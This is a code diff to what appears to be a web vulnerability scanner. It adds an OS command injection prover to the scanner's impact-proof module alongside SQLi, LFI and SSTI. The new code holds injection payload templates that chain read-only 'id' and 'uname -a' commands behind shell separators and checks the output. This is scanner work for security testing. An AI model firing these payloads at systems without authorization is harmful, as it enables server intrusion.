@@ -14,6 +14,10 @@ finding stands exactly as it was.
   a credentials file, …), so a normal page is never presented as an exfiltrated file.
 - **SSTI** — inject a unique arithmetic and confirm the server *evaluated* it (not just reflected
   the literal), with a light engine fingerprint via ``7*'7'`` — proof of template-context code exec.
+- **Command injection** — run a benign ``id``/``uname`` inside a marker-bracketed ``echo`` and read
+  the *evaluated* output back (validated against ``uid=…``/kernel patterns, so a reflected literal
+  doesn't count) — proof of OS command execution. Blind (OOB-only) cmdi returns nothing in-band, so
+  it is left unproven rather than overclaimed.
 """
 
 from __future__ import annotations
@@ -50,10 +54,10 @@ async def prove_findings_impact(
     client: HttpClient,
     findings: list[Finding],
     *,
-    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti"}),
+    families: frozenset[str] = frozenset({"sqli", "lfi", "ssti", "cmdi"}),
 ) -> int:
     """Enrich confirmed findings in place with proof of impact. Returns how many were enriched."""
-    provers = {"sqli": _prove_sqli, "lfi": _prove_lfi, "ssti": _prove_ssti}
+    provers = {"sqli": _prove_sqli, "lfi": _prove_lfi, "ssti": _prove_ssti, "cmdi": _prove_cmdi}
     proven = 0
     for finding in findings:
         if finding.impact or finding.family not in families:
@@ -239,6 +243,60 @@ async def _ssti_engine(client: HttpClient, finding: Finding, op: str, cl: str, l
     if _has_exact(resp.text, left, right, "49"):
         return "Twig/Smarty"
     return ""
+
+
+# --- OS command injection ---------------------------------------------------------------------
+# (command, a pattern its real output matches, human label). Benign, read-only commands only.
+_CMDI_PROBES: list[tuple[str, str, str]] = [
+    ("id", r"uid=\d+\(", "id"),
+    ("uname -a", r"\b(Linux|Darwin|FreeBSD|GNU|SunOS)\b", "uname -a"),
+]
+# Bracket the command's output with our delimiters via a shell ``echo`` + command substitution,
+# behind the separators that break out of the surrounding command.
+_CMDI_TEMPLATES: list[str] = [
+    "; echo {l}$({cmd}){r}",
+    "| echo {l}$({cmd}){r}",
+    "& echo {l}$({cmd}){r}",
+    "\n echo {l}$({cmd}){r}",
+]
+
+
+def _extract_validated(text: str, left: str, right: str, pattern: str) -> str | None:
+    """The first left…right pair whose content matches ``pattern`` — i.e. real command output, not
+    the reflected payload (``$(id)``), which never matches ``uid=…``."""
+    rx = re.compile(pattern)
+    for m in re.finditer(re.escape(left) + r"(.+?)" + re.escape(right), text, re.S):
+        inner = _clean(m.group(1))
+        if rx.search(inner):
+            return inner
+    return None
+
+
+async def _prove_cmdi(client: HttpClient, finding: Finding) -> str | None:
+    """Run a benign ``id``/``uname`` in-band and read the evaluated output — proof of OS command
+    execution. Blind (OOB) command injection returns nothing here, so it stays unproven."""
+    point = finding.injection_point
+    if point.location not in _INJECTABLE:
+        return None
+    tok = secrets.token_hex(5)
+    left, right = "cl" + tok, "cr" + tok
+    budget = _MAX_REQ_PER_FINDING
+    for tmpl in _CMDI_TEMPLATES:
+        for cmd, pattern, label in _CMDI_PROBES:
+            if budget <= 0:
+                return None
+            budget -= 1
+            payload = tmpl.format(l=left, r=right, cmd=cmd)
+            resp = await _send(client, build_mutated_request(point, payload))
+            if resp is None:
+                continue
+            output = _extract_validated(resp.text, left, right, pattern)
+            if output:
+                return (
+                    f"Ejecución de comandos del sistema confirmada: `{label}` devolvió «{output}». "
+                    "Demuestra que un atacante puede ejecutar comandos arbitrarios en el servidor (RCE)."
+                )
+    return None
 
 
 async def _prove_ssti(client: HttpClient, finding: Finding) -> str | None:
